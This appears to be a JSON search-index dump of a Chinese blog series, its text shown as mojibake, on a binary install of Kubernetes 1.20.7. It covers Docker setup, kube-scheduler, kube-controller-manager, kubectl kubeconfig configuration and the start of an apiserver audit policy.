16:29","objectID":"/post/2493/:0:8","tags":["k8s"],"title":"kubernetes 1.20.7 äºŒè¿›åˆ¶å®‰è£…-kubeletå®‰è£…(å)","uri":"/post/2493/"},{"categories":["kubernetes"],"content":"ä¹ã€æŸ¥çœ‹nodeçŠ¶æ€ 35370-2m3nmcn04uf.png ","date":"2021-06-22 16:29","objectID":"/post/2493/:0:9","tags":["k8s"],"title":"kubernetes 1.20.7 äºŒè¿›åˆ¶å®‰è£…-kubeletå®‰è£…(å)","uri":"/post/2493/"},{"categories":["docker","kubernetes"],"content":"ä¸€ã€é…ç½®docker yumæº wget https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo -O /etc/yum.repos.d/docker-ce.repo äºŒã€å®‰è£…docker 19.03.9 yum install -y docker-ce-19.03.9-3.el7.x86_64 ä¸‰ã€ä¿®æ”¹é…ç½®æ–‡ä»¶ mkdir /etc/docker cat \u003e /etc/docker/daemon.json \u003c\u003cEOF { \"exec-opts\": [\"native.cgroupdriver=systemd\"], \"registry-mirrors\": [ \"https://lkf7gymq.mirror.aliyuncs.com\", \"https://docker.mirrors.ustc.edu.cn\" ], \"log-driver\": \"json-file\" } EOF å››ã€å¯åŠ¨docker systemctl start docker systemctl enable docker ","date":"2021-06-22 14:21","objectID":"/post/2491/:0:0","tags":["k8s"],"title":"kubernetes 1.20.7 äºŒè¿›åˆ¶å®‰è£…-Dockerå®‰è£…é…ç½®(ä¹) ","uri":"/post/2491/"},{"categories":["kubernetes"],"content":"ä¸€ã€å®‰è£…controller-manager # ä¸‰å°æœºå™¨æ‰§è¡Œ cp /server/packages/kubernetes/server/bin/kube-scheduler /usr/local/bin/ ","date":"2021-06-22 10:57","objectID":"/post/2490/:0:1","tags":["k8s"],"title":"kubernetes 1.20.7 äºŒè¿›åˆ¶å®‰è£…-kube-scheduler(å…«)","uri":"/post/2490/"},{"categories":["kubernetes"],"content":"äºŒã€ç”Ÿæˆkubeconfigæ–‡ä»¶ cd /etc/kubernetes/ # è®¾ç½®é›†ç¾¤ä¿¡æ¯ kubectl config set-cluster kubernetes --kubeconfig=kube-scheduler.conf --server=https://172.17.20.200:6443 --certificate-authority=/etc/kubernetes/pki/ca/ca.pem --embed-certs=true # è®¾ç½®ç”¨æˆ·ä¿¡æ¯ kubectl config set-credentials kube-scheduler --kubeconfig=kube-scheduler.conf --client-certificate=/etc/kubernetes/pki/kube-scheduler.pem --client-key=/etc/kubernetes/pki/kube-scheduler-key.pem --embed-certs=true # è®¾ç½®ä¸Šä¸‹æ–‡ kubectl config set-context kubernetes --kubeconfig=kube-scheduler.conf --cluster=kubernetes --user=kube-scheduler # è®¾ç½®é»˜è®¤ä¸Šä¸‹æ–‡ kubectl config use-context --kubeconfig=kube-scheduler.conf kubernetes # åˆ†å‘åˆ°å…¶ä»–èŠ‚ç‚¹ for i in {202..203};do scp /etc/kubernetes/kube-scheduler.conf 172.17.20.$i:/etc/kubernetes/ ;done ","date":"2021-06-22 10:57","objectID":"/post/2490/:0:2","tags":["k8s"],"title":"kubernetes 1.20.7 äºŒè¿›åˆ¶å®‰è£…-kube-scheduler(å…«)","uri":"/post/2490/"},{"categories":["kubernetes"],"content":"ä¸‰ã€åˆ›å»ºsystemdå¯åŠ¨è„šæœ¬ ä¸‰å°é…ç½®ç›¸åŒ cat \u003e /etc/systemd/system/kube-scheduler.service \u003c\u003cEOF [Unit] Description=Kubernetes Scheduler Documentation=https://github.com/GoogleCloudPlatform/kubernetes [Service] ExecStart=/usr/local/bin/kube-scheduler \\\\ --authentication-kubeconfig=/etc/kubernetes/kube-scheduler.conf \\\\ --authorization-kubeconfig=/etc/kubernetes/kube-scheduler.conf \\\\ --kubeconfig=/etc/kubernetes/kube-scheduler.conf \\\\ --bind-address=0.0.0.0 \\\\ --secure-port=10259 \\\\ --client-ca-file=/etc/kubernetes/pki/ca/ca.pem \\\\ --leader-elect=true \\\\ --log-file=/var/log/kube-scheduler.log \\\\ --log-file-max-size=100 \\\\ --logtostderr=false \\\\ --tls-cert-file=/etc/kubernetes/pki/kube-scheduler.pem \\\\ --tls-private-key-file=/etc/kubernetes/pki/kube-scheduler-key.pem Restart=on-failure RestartSec=10 LimitNOFILE=65536 [Install] WantedBy=multi-user.target EOF å‚æ•°è¯´æ˜: --authentication-kubeconfig: æŒ‡å®šä¸€ä¸ªæ‹¥æœ‰åˆ›å»ºtokenreviews.authentication.k8s.ioå¯¹è±¡æƒé™çš„kubeconfigé…ç½®æ–‡ä»¶ã€‚å¦‚æœè®¾ç½®ä¸ºç©ºï¼Œåˆ™æ‰€æœ‰çš„tokenè¯·æ±‚éƒ½è¢«è§†ä¸ºåŒ¿åï¼Œä¹Ÿä¸ä¼šå¯ç”¨å®¢æˆ·ç«¯CAè®¤è¯ --authorization-kubeconfig: æŒ‡å®šä¸€ä¸ªæ‹¥æœ‰åˆ›å»ºsubjectaccessreviews.authorization.k8s.ioå¯¹è±¡æƒé™çš„kubeconfigé…ç½®æ–‡ä»¶ã€‚å¦‚æœè®¾ç½®ä¸ºç©º,åˆ™æ‰€æœ‰æœªåˆ—å…¥ç™½åå•çš„è¯·æ±‚éƒ½å°†è¢«æ‹’ç»ã€‚ --bind-address: å®‰å…¨ç«¯å£çš„ç›‘å¬åœ°å€ --secure-port: å®‰å…¨ç«¯å£ï¼Œé»˜è®¤10259 --client-ca-file: å¦‚æœæœ‰å®¢æˆ·ç«¯ä½¿ç”¨è¯ä¹¦æ¥è¯·æ±‚controller-manager,é‚£ä¹ˆcontroller-managerå°†ä¼šä½¿ç”¨æ­¤å‚æ•°æŒ‡å®šçš„æ ¹è¯ä¹¦è¿›è¡Œæ ¡éªŒ --leader-elect: trueå¼€å¯leaderé€‰ä¸¾ --log-file: æ—¥å¿—æ–‡ä»¶è·¯å¾„ --log-file-max-size: å•ä¸ªæ—¥å¿—æ–‡ä»¶çš„ä¸Šé™å¤§å°ï¼Œé»˜è®¤1800ï¼Œå•ä½MB --logtostderr: å°†æ—¥å¿—è¾“å‡ºåˆ°stderrï¼Œè€Œä¸æ˜¯æ–‡ä»¶ï¼Œé»˜è®¤trueã€‚ --tls-cert-file: æœåŠ¡ç«¯è¯ä¹¦ --tls-private-key-file: æœåŠ¡ç«¯è¯ä¹¦ç§é’¥ --kubeconfig: ä¸apiserveré€šä¿¡çš„kubeconfig --config: æŒ‡å®šé…ç½®æ–‡ä»¶çš„æ–¹å¼è¿è¡Œï¼Œæƒ³äº†è§£çš„å¯ä»¥çœ‹å®˜æ–¹æ–‡æ¡£:https://kubernetes.io/zh/docs/reference/scheduling/config/ ","date":"2021-06-22 10:57","objectID":"/post/2490/:0:3","tags":["k8s"],"title":"kubernetes 1.20.7 äºŒè¿›åˆ¶å®‰è£…-kube-scheduler(å…«)","uri":"/post/2490/"},{"categories":["kubernetes"],"content":"å››ã€å¯åŠ¨æœåŠ¡ systemctl start kube-scheduler systemctl enable kube-scheduler ","date":"2021-06-22 10:57","objectID":"/post/2490/:0:4","tags":["k8s"],"title":"kubernetes 1.20.7 äºŒè¿›åˆ¶å®‰è£…-kube-scheduler(å…«)","uri":"/post/2490/"},{"categories":["kubernetes"],"content":"äº”ã€æµ‹è¯• æŸ¥çœ‹å½“å‰leaderé”åœ¨è°æ‰‹ä¸Š kubectl get lease -n kube-system kube-scheduler NAME HOLDER AGE kube-scheduler master01_c7c38b21-3d32-4a25-b2ae-a7dde7b6c240 11m åœæ‰master01çš„kube-scheduler,è§‚å¯Ÿæ˜¯å¦èƒ½è¢«å…¶ä»–äººè·å–ã€‚ ","date":"2021-06-22 10:57","objectID":"/post/2490/:0:5","tags":["k8s"],"title":"kubernetes 1.20.7 äºŒè¿›åˆ¶å®‰è£…-kube-scheduler(å…«)","uri":"/post/2490/"},{"categories":["kubernetes"],"content":"ä¸€ã€å®‰è£…controller-manager # ä¸‰å°æœºå™¨æ‰§è¡Œ cp /server/packages/kubernetes/server/bin/kube-controller-manager /usr/local/bin/ ","date":"2021-06-21 09:50","objectID":"/post/2484/:0:1","tags":["k8s"],"title":"kubernetes 1.20.7 äºŒè¿›åˆ¶å®‰è£…-controller-manager(ä¸ƒ)","uri":"/post/2484/"},{"categories":["kubernetes"],"content":"äºŒã€ç”Ÿæˆkubeconfigæ–‡ä»¶ å…³äºkubeconfigå¯ä»¥çœ‹ä¸Šä¸€ç¯‡æ–‡ç« : https://soulchild.cn/2478.html cd /etc/kubernetes/ # è®¾ç½®é›†ç¾¤ä¿¡æ¯ kubectl config set-cluster kubernetes --kubeconfig=controller-manager.conf --server=https://172.17.20.200:6443 --certificate-authority=/etc/kubernetes/pki/ca/ca.pem --embed-certs=true # è®¾ç½®ç”¨æˆ·ä¿¡æ¯ kubectl config set-credentials controller-manager --kubeconfig=controller-manager.conf --client-certificate=/etc/kubernetes/pki/kube-controller-manager.pem --client-key=/etc/kubernetes/pki/kube-controller-manager-key.pem --embed-certs=true # è®¾ç½®ä¸Šä¸‹æ–‡ä¿¡æ¯,å°†ç”¨æˆ·å’Œé›†ç¾¤å…³è” kubectl config set-context controller-manager --kubeconfig=controller-manager.conf --cluster=kubernetes --user=controller-manager # è®¾ç½®é…ç½®æ–‡ä»¶ä¸­é»˜è®¤çš„ä¸Šä¸‹æ–‡ kubectl config use-context controller-manager --kubeconfig=controller-manager.conf # åˆ†å‘åˆ°å…¶ä»–æœºå™¨ for i in {202..203};do scp /etc/kubernetes/controller-manager.conf 172.17.20.$i:/etc/kubernetes/ ;done ","date":"2021-06-21 09:50","objectID":"/post/2484/:0:2","tags":["k8s"],"title":"kubernetes 1.20.7 äºŒè¿›åˆ¶å®‰è£…-controller-manager(ä¸ƒ)","uri":"/post/2484/"},{"categories":["kubernetes"],"content":"ä¸‰ã€åˆ›å»ºsystemdå¯åŠ¨è„šæœ¬ ä¸‰å°é…ç½®ç›¸åŒ cat \u003e /etc/systemd/system/kube-controller-manager.service \u003c\u003cEOF [Unit] Description=Kubernetes Controller Manager Documentation=https://github.com/GoogleCloudPlatform/kubernetes [Service] ExecStart=/usr/local/bin/kube-controller-manager \\\\ --allocate-node-cidrs=true \\\\ --cluster-cidr=10.244.0.0/16 \\\\ --service-cluster-ip-range=10.1.0.0/16 \\\\ --node-cidr-mask-size=24 \\\\ --authentication-kubeconfig=/etc/kubernetes/controller-manager.conf \\\\ --authorization-kubeconfig=/etc/kubernetes/controller-manager.conf \\\\ --bind-address=0.0.0.0 \\\\ --client-ca-file=/etc/kubernetes/pki/ca/ca.pem \\\\ --cluster-name=kubernetes \\\\ --cluster-signing-cert-file=/etc/kubernetes/pki/ca/ca.pem \\\\ --cluster-signing-key-file=/etc/kubernetes/pki/ca/ca-key.pem \\\\ --cluster-signing-duration=87600h \\\\ --concurrent-deployment-syncs=10 \\\\ --controllers=*,bootstrapsigner,tokencleaner \\\\ --horizontal-pod-autoscaler-initial-readiness-delay=30s \\\\ --horizontal-pod-autoscaler-sync-period=10s \\\\ --kube-api-burst=100 \\\\ --kube-api-qps=100 \\\\ --kubeconfig=/etc/kubernetes/controller-manager.conf \\\\ --leader-elect=true \\\\ --logtostderr=false \\\\ --log-file=/var/log/kube-controller-manager.log \\\\ --log-file-max-size=100 \\\\ --pod-eviction-timeout=1m \\\\ --root-ca-file=/etc/kubernetes/pki/ca/ca.pem \\\\ --secure-port=10257 \\\\ --service-account-private-key-file=/etc/kubernetes/pki/apiserver-key.pem \\\\ --tls-cert-file=/etc/kubernetes/pki/kube-controller-manager.pem \\\\ --tls-private-key-file=/etc/kubernetes/pki/kube-controller-manager-key.pem \\\\ --use-service-account-credentials=true Restart=on-failure RestartSec=10 LimitNOFILE=65536 [Install] WantedBy=multi-user.target EOF å‚æ•°è¯´æ˜: --allocate-node-cidrs: æ˜¯å¦è‡ªåŠ¨åˆ†é…CIDRåœ°å€èŒƒå›´å¹¶è®¾ç½®åˆ°äº‘æä¾›å•†ä¸Š, åœ¨è£¸æœºéƒ¨ç½²çš„æƒ…å†µä¸‹å¯ç”¨â€“allocate-node-cidrså‚æ•°å¯ä»¥ç¡®ä¿å°†è¿™äº›CIDRåœ°å€èŒƒå›´åˆ†é…ç»™æ–°åŠ å…¥é›†ç¾¤çš„èŠ‚ç‚¹ï¼Œå¹¶å°†å…¶ä¿å­˜åˆ°etcdä¸­ã€‚ --cluster-cidr: pod ipçš„èŒƒå›´ã€‚è¦æ±‚--allocate-node-cidrsä¸ºtrueã€‚ --service-cluster-ip-range: cluster ipçš„èŒƒå›´ï¼Œå’Œapiserverä¸­çš„è¦ä¸€è‡´ã€‚è¦æ±‚--allocate-node-cidrsä¸ºtrueã€‚ --node-cidr-mask-size: è®¾ç½®ä¸€ä¸ªnodeèŠ‚ç‚¹å¯ä»¥ä½¿ç”¨çš„pod ipæ•°é‡åŠèŒƒå›´ï¼Œè¿™é‡Œå¡«å†™çš„æ˜¯æ©ç . æ‰€æœ‰å¯ç”¨pod ipæ•°é‡/nodeå¯ç”¨ipæ•°é‡=æœ€å¤§èŠ‚ç‚¹æ•°ã€‚(æˆ‘çŒœçš„ã€‚ã€‚) --authentication-kubeconfig: æŒ‡å®šä¸€ä¸ªæ‹¥æœ‰åˆ›å»ºtokenreviews.authentication.k8s.ioå¯¹è±¡æƒé™çš„kubeconfigé…ç½®æ–‡ä»¶ã€‚å¦‚æœè®¾ç½®ä¸ºç©ºï¼Œåˆ™æ‰€æœ‰çš„tokenè¯·æ±‚éƒ½è¢«è§†ä¸ºåŒ¿åï¼Œä¹Ÿä¸ä¼šå¯ç”¨å®¢æˆ·ç«¯CAè®¤è¯ --authorization-kubeconfig: æŒ‡å®šä¸€ä¸ªæ‹¥æœ‰åˆ›å»ºsubjectaccessreviews.authorization.k8s.ioå¯¹è±¡æƒé™çš„kubeconfigé…ç½®æ–‡ä»¶ã€‚å¦‚æœè®¾ç½®ä¸ºç©º,åˆ™æ‰€æœ‰æœªåˆ—å…¥ç™½åå•çš„è¯·æ±‚éƒ½å°†è¢«æ‹’ç»ã€‚ --bind-address: ç›‘å¬åœ°å€ --client-ca-file: å¦‚æœæœ‰å®¢æˆ·ç«¯ä½¿ç”¨è¯ä¹¦æ¥è¯·æ±‚controller-manager,é‚£ä¹ˆcontroller-managerå°†ä¼šä½¿ç”¨æ­¤å‚æ•°æŒ‡å®šçš„æ ¹è¯ä¹¦è¿›è¡Œæ ¡éªŒ --cluster-name: é›†ç¾¤åç§°ï¼Œé»˜è®¤kubernetes --cluster-signing-cert-file: ç”¨äºç­¾å‘è¯ä¹¦çš„CAæ ¹è¯ä¹¦ --cluster-signing-key-file: ç”¨äºç­¾å‘è¯ä¹¦çš„CAæ ¹è¯ä¹¦çš„ç§é’¥ --cluster-signing-duration: ç­¾å‘è¯ä¹¦çš„æœ‰æ•ˆæœŸ,é»˜è®¤8760h0m0sã€‚(æ„Ÿè§‰æœ€å¤§èƒ½åˆ°5å¹´,æˆ‘è®¾ç½®çš„10å¹´,é€šè¿‡opensslæŸ¥çœ‹ç­¾å‘çš„è¯ä¹¦æœ‰æ•ˆæœŸåªæœ‰5å¹´ã€‚) --concurrent-deployment-syncs: å…è®¸å¹¶å‘åŒæ­¥deploymentçš„æ•°é‡,é»˜è®¤5ã€‚æ•°å­—è¶Šå¤§ï¼Œdeploymentå“åº”è¶Šå¿«ï¼Œä½†CPUå’Œç½‘ç»œè´Ÿè½½ä¼šé«˜ã€‚ --controllers: è¦å¯ç”¨çš„æ§åˆ¶å™¨åˆ—è¡¨ã€‚*è¡¨ç¤ºå¯ç”¨æ‰€æœ‰é»˜è®¤å¯ç”¨çš„æ§åˆ¶å™¨ã€‚fooè¡¨ç¤ºå¯ç”¨åä¸ºfooçš„æ§åˆ¶å™¨ï¼› -foo è¡¨ç¤ºç¦ç”¨åä¸º fooçš„æ§åˆ¶å™¨ã€‚ æ‰€æœ‰æ§åˆ¶å™¨ï¼šattachdetachã€bootstrapsignerã€cloud-node-lifecycleã€clusterrole-aggregationã€cronjobã€csrapprovingã€csrcleanerã€csrsigningã€daemonsetã€deploymentã€disruptionã€endpointã€endpointsliceã€endpointslicemirroringã€ephemeral-volumeã€garbagecollectorã€horizontalpodautoscalingã€jobã€namespaceã€nodeipamã€nodelifecycleã€persistentvolume-binderã€persistentvolume-expanderã€podgcã€pv-protectionã€pvc-protectionã€replicasetã€replicationcontrollerã€resourcequotaã€root-ca-cert-publisherã€routeã€serviceã€serviceaccountã€serviceaccount-tokenã€statefulsetã€tokencleanerã€ttlã€ttl-after-finished é»˜è®¤ç¦ç”¨çš„æ§åˆ¶å™¨ï¼šbootstrapsigner å’Œ tokencleanerã€‚ --horizontal-pod-autoscaler-initial-readiness-delay: hpaç›¸å…³é…ç½®ï¼Œåˆå§‹åŒ–æ—¶é—´,ç”¨äºå»¶è¿Ÿé‡‡æ ·,é»˜è®¤30s --horizontal-pod-autoscaler-sync-period: hpaç›¸å…³é…ç½®ï¼Œæ£€æŸ¥å‘¨æœŸï¼ˆé»˜è®¤ä¸º15sï¼‰ --kube-api-burst: controller-managerä¸apiserveré€šä¿¡æ—¶çªå‘è¯·æ±‚ä¸ªæ•°ä¸Šé™ã€‚é»˜è®¤30. --kube-api-qps: ä¸apiseveré€šä¿¡æ—¶çš„QPSé™åˆ¶ã€‚é»˜è®¤20. --kubeconfig: ä¸apiserveré€šä¿¡çš„kubeconfig --leader-elect: trueå¼€å¯leaderé€‰ä¸¾ --logtostderr: å°†æ—¥å¿—è¾“å‡ºåˆ°stderrï¼Œè€Œä¸æ˜¯æ–‡ä»¶ï¼Œé»˜è®¤trueã€‚ --log-file: æ—¥å¿—æ–‡ä»¶è·¯å¾„ --log-file-max-size: å•ä¸ªæ—¥å¿—æ–‡ä»¶çš„ä¸Šé™å¤§å°ï¼Œé»˜è®¤1800ï¼Œå•ä½MB --node-monitor-period: æ¯éš”ä¸€æ®µæ—¶é—´æ£€æŸ¥kubeletçš„çŠ¶æ€ï¼Œé»˜è®¤5s --node-monitor-grace-period: å°†ä¸€ä¸ªNodeèŠ‚ç‚¹æ ‡è®°ä¸ºnotreadyä¹‹å‰æ²¡æœ‰å“åº”çš„æ—¶é—´,é»˜è®¤40sã€‚å¿…é¡»æ˜¯kubeletçš„ nodeStatusUpdateFrequency(å‚æ•°â€“node-status-update-frequency,é»˜è®¤10s)çš„Nå€ --node-startup","date":"2021-06-21 09:50","objectID":"/post/2484/:0:3","tags":["k8s"],"title":"kubernetes 1.20.7 äºŒè¿›åˆ¶å®‰è£…-controller-manager(ä¸ƒ)","uri":"/post/2484/"},{"categories":["kubernetes"],"content":"å››ã€å¯åŠ¨æœåŠ¡ systemctl start kube-controller-manager systemctl enable kube-controller-manager ","date":"2021-06-21 09:50","objectID":"/post/2484/:0:4","tags":["k8s"],"title":"kubernetes 1.20.7 äºŒè¿›åˆ¶å®‰è£…-controller-manager(ä¸ƒ)","uri":"/post/2484/"},{"categories":["kubernetes"],"content":"äº”ã€æµ‹è¯• æŸ¥çœ‹å½“å‰leaderèŠ‚ç‚¹ kubectl get lease -n kube-system kube-controller-manager NAME HOLDER AGE kube-controller-manager master02_d6925209-5d63-4840-bc1c-9f16f4d8547b 14h # å½“å‰leaderæ˜¯master02 åœæ‰master02çš„controller-manager,è§‚å¯Ÿæ˜¯å¦ä¼šåˆ‡æ¢åˆ°å…¶ä»–èŠ‚ç‚¹ ","date":"2021-06-21 09:50","objectID":"/post/2484/:0:5","tags":["k8s"],"title":"kubernetes 1.20.7 äºŒè¿›åˆ¶å®‰è£…-controller-manager(ä¸ƒ)","uri":"/post/2484/"},{"categories":["kubernetes"],"content":"å®˜æ–¹æ–‡æ¡£: https://kubernetes.io/zh/docs/concepts/configuration/organize-cluster-access-kubeconfig/ https://kubernetes.io/docs/reference/generated/kubectl/kubectl-commands ","date":"2021-06-18 16:20","objectID":"/post/2478/:0:0","tags":["k8s"],"title":"kubernetes 1.20.7 äºŒè¿›åˆ¶å®‰è£…-kubectlå®¢æˆ·ç«¯é…ç½®ä»¥åŠkubeconfigè¯´æ˜(å…­)","uri":"/post/2478/"},{"categories":["kubernetes"],"content":"1.å®‰è£…kubectl # å…·ä½“è£…åœ¨å“ªå°æœºå™¨æ ¹æ®è‡ªå·±çš„éœ€æ±‚ cp /server/packages/kubernetes/server/bin/kubectl /usr/local/bin/ # é…ç½®completionè¡¥å…¨å¢å¼º echo 'source \u003c(kubectl completion bash)' \u003e\u003e ~/.bashrc source ~/.bashrc ","date":"2021-06-18 16:20","objectID":"/post/2478/:0:1","tags":["k8s"],"title":"kubernetes 1.20.7 äºŒè¿›åˆ¶å®‰è£…-kubectlå®¢æˆ·ç«¯é…ç½®ä»¥åŠkubeconfigè¯´æ˜(å…­)","uri":"/post/2478/"},{"categories":["kubernetes"],"content":"2.é…ç½®kubeconfig é»˜è®¤æƒ…å†µä¸‹ï¼Œkubectlåœ¨$HOME/.kubeç›®å½•ä¸‹æŸ¥æ‰¾åä¸ºconfigçš„æ–‡ä»¶ã€‚ ä¹Ÿå¯ä»¥é€šè¿‡è®¾ç½®KUBECONFIGç¯å¢ƒå˜é‡æˆ–è€…è®¾ç½®--kubeconfigå‚æ•°æ¥æŒ‡å®škubeconfigæ–‡ä»¶ã€‚ kubeconfigç”±é›†ç¾¤ä¿¡æ¯,ç”¨æˆ·å‡­æ®,ä¸Šä¸‹æ–‡ç»„æˆï¼Œè¿™äº›å†…å®¹åœ¨ä¸€ä¸ªé…ç½®æ–‡ä»¶ä¸­å¯ä»¥é…ç½®å¤šä¸ªï¼Œæ‰€ä»¥kubeconfigæ”¯æŒå¤šé›†ç¾¤é…ç½®,å¹¶ä¸”å¯ä»¥é€šè¿‡ä¸Šä¸‹æ–‡æ¥åˆ‡æ¢é›†ç¾¤ã€‚ ä¸‹é¢æˆ‘ä»¬ä½¿ç”¨kubectlå‘½ä»¤ç”Ÿæˆä¸€ä¸ªkubeconfigé…ç½®æ–‡ä»¶ 1.å°†ç¾¤é›†ä¿¡æ¯æ·»åŠ åˆ°é…ç½®æ–‡ä»¶ä¸­ cd /etc/kubernetes/ # é…ç½®apiserveråœ°å€ã€CAæœºæ„è¯ä¹¦ kubectl config set-cluster kubernetes \\ --embed-certs=true \\ --certificate-authority=/etc/kubernetes/pki/ca/ca.pem \\ --server=https://172.17.20.200:6443 \\ --kubeconfig=admin.conf å‚æ•°è¯´æ˜: --set-cluster kubernetes: åç»­çš„è®¾ç½®å°†å¯¹ä¸€ä¸ªåä¸ºkubernetesçš„é›†ç¾¤ç”Ÿæ•ˆ(ä¸å­˜åœ¨ä¼šåœ¨é…ç½®æ–‡ä»¶ä¸­æ·»åŠ ) --embed-certs: è®¾ç½®ä¸ºtrueï¼Œå°†è¯ä¹¦ä¿¡æ¯å†…åµŒåˆ°é…ç½®æ–‡ä»¶ä¸­(é»˜è®¤æ˜¯é…ç½®çš„è¯ä¹¦è·¯å¾„) --certificate-authority: æŒ‡å®šä¸€ä¸ªä¿¡ä»»çš„æ ¹CAï¼Œç”¨äºæ ¡éªŒæœåŠ¡ç«¯è¯ä¹¦ --server: æŒ‡å®šapiserverçš„åœ°å€ --kubeconfig: æŒ‡å®šé…ç½®æ–‡ä»¶è·¯å¾„ 2.å°†ç”¨æˆ·è®¤è¯ä¿¡æ¯æ·»åŠ åˆ°é…ç½®æ–‡ä»¶ä¸­ kubectl config set-credentials admin \\ --embed-certs=true \\ --client-certificate=/etc/kubernetes/pki/admin.pem \\ --client-key=/etc/kubernetes/pki/admin-key.pem \\ --kubeconfig=admin.conf è¿™æ—¶kubectlæœ‰äº†é›†ç¾¤ä¿¡æ¯,ç”¨æˆ·è®¤è¯ä¿¡æ¯ï¼Œä½†è¿˜æ˜¯ä¸èƒ½ä½¿ç”¨ï¼Œæˆ‘ä»¬éœ€è¦åœ¨æ·»åŠ ä¸€ä¸ªä¸Šä¸‹æ–‡ä¿¡æ¯ï¼Œç”¨äºè¡¨ç¤ºå“ªä¸ªç”¨æˆ·å’Œå“ªä¸ªé›†ç¾¤ç»‘å®š å‚æ•°è¯´æ˜: set-credentials admin: å¯¹å½“å‰ç”¨æˆ·è®¾ç½®ä¸€ä¸ªåç§°(éšä¾¿èµ·) --embed-certs: è®¾ç½®ä¸ºtrueï¼Œå°†è¯ä¹¦ä¿¡æ¯å†…åµŒåˆ°é…ç½®æ–‡ä»¶ä¸­(é»˜è®¤æ˜¯é…ç½®çš„è¯ä¹¦è·¯å¾„) --client-certificate: è®¿é—®apiserverä½¿ç”¨çš„è¯ä¹¦ --client-key: è®¿é—®apiserverä½¿ç”¨çš„è¯ä¹¦çš„ç§é’¥ --kubeconfig: æŒ‡å®šé…ç½®æ–‡ä»¶è·¯å¾„ 3.å°†ä¸Šä¸‹æ–‡(context)ä¿¡æ¯æ·»åŠ åˆ°é…ç½®æ–‡ä»¶ä¸­ kubectl config set-context kubernetes \\ --cluster=kubernetes \\ --user=admin \\ --kubeconfig=admin.conf å°†adminç”¨æˆ·ä¸kubernetesè¿™ä¸ªé›†ç¾¤ç»‘å®š,è¿™æ—¶é€šè¿‡kubectl cluster info â€“kubeconfig=admin.conf â€“context=kuberneteså°±å¯ä»¥ä½¿ç”¨äº†ï¼Œä½†æ˜¯æŒ‡å®šä¸Šä¸‹æ–‡å¾ˆä¸æ–¹ä¾¿ï¼Œæˆ‘ä»¬ä¸‹ä¸€æ­¥è®¾ç½®ä¸€ä¸ªé»˜è®¤çš„ä¸Šä¸‹æ–‡ set-context kubernetes: ä¸Šä¸‹æ–‡çš„åç§° --cluster: æŒ‡å®šå“ªä¸ªé›†ç¾¤ --user: æŒ‡å®šå“ªä¸ªç”¨æˆ· --kubeconfig: æŒ‡å®šé…ç½®æ–‡ä»¶è·¯å¾„ 4.æŒ‡å®šé»˜è®¤è¦ä½¿ç”¨å“ªä¸ªä¸Šä¸‹æ–‡é…ç½® kubectl config use-context kubernetes --kubeconfig=admin.conf 5.å¤åˆ¶é…ç½®æ–‡ä»¶åˆ°é»˜è®¤æŸ¥æ‰¾ç›®å½• cp admin.conf ~/.kube/config ","date":"2021-06-18 16:20","objectID":"/post/2478/:0:2","tags":["k8s"],"title":"kubernetes 1.20.7 äºŒè¿›åˆ¶å®‰è£…-kubectlå®¢æˆ·ç«¯é…ç½®ä»¥åŠkubeconfigè¯´æ˜(å…­)","uri":"/post/2478/"},{"categories":["kubernetes"],"content":"3.æµ‹è¯•æ˜¯å¦æ­£å¸¸ä½¿ç”¨ kubectl cluster-info kubectl get svc ","date":"2021-06-18 16:20","objectID":"/post/2478/:0:3","tags":["k8s"],"title":"kubernetes 1.20.7 äºŒè¿›åˆ¶å®‰è£…-kubectlå®¢æˆ·ç«¯é…ç½®ä»¥åŠkubeconfigè¯´æ˜(å…­)","uri":"/post/2478/"},{"categories":["ç³»ç»ŸæœåŠ¡","kubernetes"],"content":"ä¸€ã€å®‰è£…apiserver 1.ä¸‹è½½serveråŒ… cd /server/packages/ wget https://dl.k8s.io/v1.20.7/kubernetes-server-linux-amd64.tar.gz # åˆ†å‘åˆ°å…¶ä»–æœºå™¨ for i in {202..203};do scp kubernetes-server-linux-amd64.tar.gz 172.17.20.$i:`pwd` ;done 2.å®‰è£…apiserver # ä¸‰å°æœºå™¨æ‰§è¡Œ tar xf kubernetes-server-linux-amd64.tar.gz cp kubernetes/server/bin/kube-apiserver /usr/local/bin 3.åˆ›å»ºå®¡è®¡æ—¥å¿—ç­–ç•¥é…ç½®æ–‡ä»¶ None - ç¬¦åˆè¿™æ¡è§„åˆ™çš„æ—¥å¿—å°†ä¸ä¼šè®°å½• Metadata - è®°å½•è¯·æ±‚çš„å…ƒæ•°æ®ï¼ˆè¯·æ±‚çš„ç”¨æˆ·ã€æ—¶é—´æˆ³ã€èµ„æºã€åŠ¨è¯ç­‰ç­‰ï¼‰ï¼Œ ä½†æ˜¯ä¸è®°å½•è¯·æ±‚æˆ–è€…å“åº”çš„æ¶ˆæ¯ä½“ã€‚ Request - è®°å½•äº‹ä»¶çš„å…ƒæ•°æ®å’Œè¯·æ±‚çš„æ¶ˆæ¯ä½“ï¼Œä½†æ˜¯ä¸è®°å½•å“åº”çš„æ¶ˆæ¯ä½“ã€‚ è¿™ä¸é€‚ç”¨äºéèµ„æºç±»å‹çš„è¯·æ±‚ã€‚ RequestResponse - è®°å½•äº‹ä»¶çš„å…ƒæ•°æ®ï¼Œè¯·æ±‚å’Œå“åº”çš„æ¶ˆæ¯ä½“ã€‚è¿™ä¸é€‚ç”¨äºéèµ„æºç±»å‹çš„è¯·æ±‚ã€‚ å®¡è®¡é…ç½®çš„apiæ–‡æ¡£:https://kubernetes.io/zh/docs/reference/config-api/apiserver-audit.v1/#resource-types ä¸‹é¢é…ç½®æ¥æºkubernetes code cat \u003e /etc/kubernetes/audit-policy.yaml \u003c\u003cEOF apiVersion: audit.k8s.io/v1 kind: Policy rules: # ä¸è®°å½•ä¸€äº›é«˜å®¹é‡å’Œä½é£é™©çš„æ—¥å¿—. - level: None users: [\"system:kube-proxy\"] verbs: [\"watch\"] resources: - group: \"\" # core resources: [\"endpoints\", \"services\", \"services/status\"] - level: None # Ingress controller reads 'configmaps/ingress-uid' through the unsecured port. # TODO(#46983): Change this to the ingress controller service account. users: [\"system:unsecured\"] namespaces: [\"kube-system\"] verbs: [\"get\"] resources: - group: \"\" # core resources: [\"configmaps\"] - level: None users: [\"kubelet\"] # legacy kubelet identity verbs: [\"get\"] resources: - group: \"\" # core resources: [\"nodes\", \"nodes/status\"] - level: None userGroups: [\"system:nodes\"] verbs: [\"get\"] resources: - group: \"\" # core resources: [\"nodes\", \"nodes/status\"] - level: None users: - system:kube-controller-manager - system:kube-scheduler - system:serviceaccount:kube-system:endpoint-controller verbs: [\"get\", \"update\"] namespaces: [\"kube-system\"] resources: - 